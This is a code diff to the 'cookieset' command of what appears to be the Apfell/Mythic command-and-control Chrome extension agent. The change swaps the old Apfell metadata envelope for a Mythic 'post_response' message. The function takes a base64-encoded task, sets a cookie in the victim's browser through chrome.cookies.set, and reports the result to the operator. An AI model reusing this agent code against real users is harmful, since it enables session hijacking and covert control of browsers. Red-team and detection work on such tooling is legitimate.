@@ -1,7 +1,5 @@
-cookieset = function(params) {
-    let details = JSON.parse(atob(params['data'].toString()));
-    let taskid = params['taskid'];
-    let tasktype = params['tasktype'];
+cookieset = function(task) {
+    let details = JSON.parse(atob(task['params'].toString()));
     chrome.cookies.set(details, function(cookie){
         let resp;
         if (cookie === null) {
@@ -10,13 +8,12 @@ cookieset = function(params) {
             resp = JSON.stringify(cookie, null, 2);
         }
 
-        const data = btoa(unescape(encodeURIComponent(resp)));
-        const apfellMsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, data.length, taskid, tasktype, data);
-        let meta = {};
-        meta["metatype"] = 3;
-        meta["metadata"] = apfellMsg;
-        const metaenvelope = JSON.stringify(meta);
-        out.push(metaenvelope);
+        response = {'task_id':task['task_id'], 'user_output':resp, 'completed':true};
+        outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
+        enc = JSON.stringify(outer_response);
+        final = apfell.apfellid + enc;
+        msg = btoa(unescape(encodeURIComponent(final)));
+        out.push(msg);
     });
 };
 
